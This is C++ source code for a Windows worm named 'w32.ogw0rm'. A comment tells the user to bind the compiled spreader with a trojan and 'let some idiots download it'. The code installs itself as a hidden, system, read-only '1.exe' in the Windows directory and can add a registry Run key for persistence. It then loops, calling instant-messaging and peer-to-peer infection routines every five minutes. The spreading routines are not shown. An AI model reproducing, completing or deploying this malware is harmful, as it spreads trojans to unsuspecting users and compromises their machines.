/*

	After you compiled the Spreader, bind it with a trojan, or something
	else you want to Spread. Upload it to the host you put in the
	Spreaders Message, and let some idiots download it.

*/

#include "Includes.h"

bool Registry = false;										// Install Registry Key
char Filename[] = "1.exe";									// Filename Of Worm
char Valuename[] = "winsock startup";						// Valuename For Start-Up
char Version[] = "w32.ogw0rm";								// Version

bool InitWinSock()
{
	WSADATA *wsaData = new WSADATA;

	if (wsaData)
		ZeroMemory(wsaData, sizeof(wsaData));
	else
		ExitThread(0);

	if (WSAStartup(MAKEWORD(2, 2), wsaData) != 0)
		return false;

	if (LOBYTE(wsaData->wVersion) != 2 ||
		HIBYTE(wsaData->wVersion) != 2)
	{
		WSACleanup();
		return false;
	}

	delete wsaData;
	return true;
}

bool Install() 
{
   InstallInfo_s *pInstallInfo_s = new InstallInfo_s; 

	if (pInstallInfo_s) 
		ZeroMemory(pInstallInfo_s, sizeof(InstallInfo_s));
	else
		ExitThread(0);

	GetModuleFileName(GetModuleHandle(NULL), pInstallInfo_s->szFilePath, sizeof(pInstallInfo_s->szFilePath)); 
	GetWindowsDirectory(pInstallInfo_s->szMainPath, sizeof(pInstallInfo_s->szMainPath)); 
	_snprintf(pInstallInfo_s->szInstallPath, sizeof(pInstallInfo_s->szInstallPath), "%s\\%s", pInstallInfo_s->szMainPath, Filename); 
	if (CopyFile(pInstallInfo_s->szFilePath, pInstallInfo_s->szInstallPath, false) != 0) 
	{ 
		SetFileAttributes(pInstallInfo_s->szInstallPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY);    
	} 
	if (Registry) 
	{ 
		RegCreateKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &pInstallInfo_s->hKey, NULL); 
		RegSetValueEx(pInstallInfo_s->hKey, Valuename, 0, REG_SZ, (const unsigned char *)Filename, strlen(Filename)); 
		RegCloseKey(pInstallInfo_s->hKey); 
	} 
	delete pInstallInfo_s;
	return true; 
} 

bool Main()
{
	if (!InitWinSock())
		return false;

	Install();

	CreateMutex(NULL, false, Version);
	if (GetLastError() == ERROR_ALREADY_EXISTS) 
		ExitProcess(0);

	while (true)
	{
#ifndef NO_IMSPREAD
		InfectIM();
#endif
#ifndef NO_P2PSPREAD
		InfectP2P();
#endif
		Sleep(1000*300);
	}
	return true;
}
